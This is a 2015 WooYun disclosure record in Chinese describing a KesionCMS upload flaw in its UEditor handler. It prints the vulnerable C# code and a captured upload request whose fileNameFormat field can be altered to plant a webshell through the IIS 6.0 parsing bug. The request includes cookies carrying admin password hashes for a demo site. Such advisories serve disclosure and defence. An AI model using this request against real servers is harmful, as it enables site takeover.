{"id": 35766, "wybug_id": "wooyun-2015-0103231", "wybug_title": "KesionCMS多系统前台上传漏洞", "wybug_corp": "kesion.com", "wybug_author": "路人甲", "wybug_date": "2015-03-24 18:06", "wybug_open_date": "2015-06-23 09:34", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["解析漏洞", "文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-23：\t细节向公众公开  简要描述：  详细说明：  涉及版本KesionICMS 智能建站系统 V2.5KesionEshop 在线商城系统 X1.0.141206KesionIMALL 在线商城系统 V2.5KesionEdu 网校培训系统 V2.5下载地址：http://www.kesion.com/Product/演示站 上传不了 虚拟机搭建测试------------------------------------------------------------------------由于上述系统 前台均 采用UEditor编辑器 //应该是二次开发的 造成此漏洞\n\n\n\n\n涉及文件     \\Plus\\ueditor\\uploader.cspublic static class NameFormater    {        public static string Format(string format, string filename)        {            if (String.IsNullOrEmpty(format))            {                format = \"{filename}{rand:6}\";            }            string ext = Path.GetExtension(filename);            filename = Path.GetFileNameWithoutExtension(filename);            format = format.Replace(\"{filename}\", filename);            format = new Regex(@\"\\{rand(\\:?)(\\d+)\\}\", RegexOptions.Compiled).Replace(format, new MatchEvaluator(delegate(Match match)            {                int digit = 6;                if (match.Groups.Count > 2)                {                    digit = Convert.ToInt32(match.Groups[2].Value);                }                Random rand = new Random();                return rand.Next((int)Math.Pow(10, digit), (int)Math.Pow(10, digit + 1)).ToString();            }));            format = format.Replace(\"{time}\", DateTime.Now.Ticks.ToString());            format = format.Replace(\"{yyyy}\", DateTime.Now.Year.ToString());            format = format.Replace(\"{yy}\", (DateTime.Now.Year % 100).ToString(\"D2\"));            format = format.Replace(\"{mm}\", DateTime.Now.Month.ToString(\"D2\"));            format = format.Replace(\"{dd}\", DateTime.Now.Day.ToString(\"D2\"));            format = format.Replace(\"{hh}\", DateTime.Now.Hour.ToString(\"D2\"));            format = format.Replace(\"{ii}\", DateTime.Now.Minute.ToString(\"D2\"));            format = format.Replace(\"{ss}\", DateTime.Now.Second.ToString(\"D2\"));            Regex invalidPattern = new Regex(@\"[\\\\\\/\\:\\*\\?\\042\\<\\>\\|]\");            format = invalidPattern.Replace(format, \"\");            return format + ext;        }    }\n抓包\nPOST /plus/ueditor/imageUp.ashx HTTP/1.1Host: demo.bkwy.orgProxy-Connection: keep-aliveContent-Length: 824Cache-Control: no-cacheOrigin: http://demo.bkwy.orgUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36Content-Type: multipart/form-data; boundary=tmbtrfjfrrifujwmvskngarqwewwieuoAccept: */*Referer: http://demo.bkwy.org/ueditor/dialogs/image/imageUploader.swfAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: Admin=AdminID=76&AdminUser=admin&AdminPass=469e80d32c0559f8&UserType=1&PowerList=&DocPower=1&AdminLoginCode=; myShop=userName=iz8ez4tgy5gw; myViewRecord=userName=6jmr6hlgq7r9; ASP.NET_SessionId=wfkb2dffjuvnzauyqfpacemj; CheckCode=44T2L; User=userid=191&username=test&password=49ba59abbe56e057&RndPassword=K1P6WLJ957L2NCCPH1SX--tmbtrfjfrrifujwmvskngarqwewwieuoContent-Disposition: form-data; name=\"fileName\"0000.gif--tmbtrfjfrrifujwmvskngarqwewwieuoContent-Disposition: form-data; name=\"dir\"/UploadFiles/2015-3/76--tmbtrfjfrrifujwmvskngarqwewwieuoContent-Disposition: form-data; name=\"Filename\"0000.gif--tmbtrfjfrrifujwmvskngarqwewwieuoContent-Disposition: form-data; name=\"pictitle\"0000.gif--tmbtrfjfrrifujwmvskngarqwewwieuoContent-Disposition: form-data; name=\"fileNameFormat\"{time}{rand:6}                                         //这里是后缀前的时间 可以修改成随意东西除了asp asa aspx几个敏感东西  --tmbtrfjfrrifujwmvskngarqwewwieuoContent-Disposition: form-data; name=\"upfile\"; filename=\"0000.gif\"Content-Type: application/octet-streamxxxxxx--tmbtrfjfrrifujwmvskngarqwewwieuoContent-Disposition: form-data; name=\"Upload\"Submit Query--tmbtrfjfrrifujwmvskngarqwewwieuo--\n修改 fileNameFormat参数里的东西    利用iis6.0上传漏洞可拿下webshell\n\n我随便找个案例测试吧。。\n\n\n\n随便在案例里看了几个   这里都不能点击 但是源文件还是存在的 直接构造之\n\n\n\n一个够了。随便到案例里翻了翻  IIS6.0不少   漏洞证明：  \n\n   修复方案：  你们懂得   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-03-25 09:33 厂商回复： 感谢的供，已安排测试！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-28 09:10 |    \t\tcmdshell \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:9        )\t\t \n  就没有人公布下嘛－ －    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}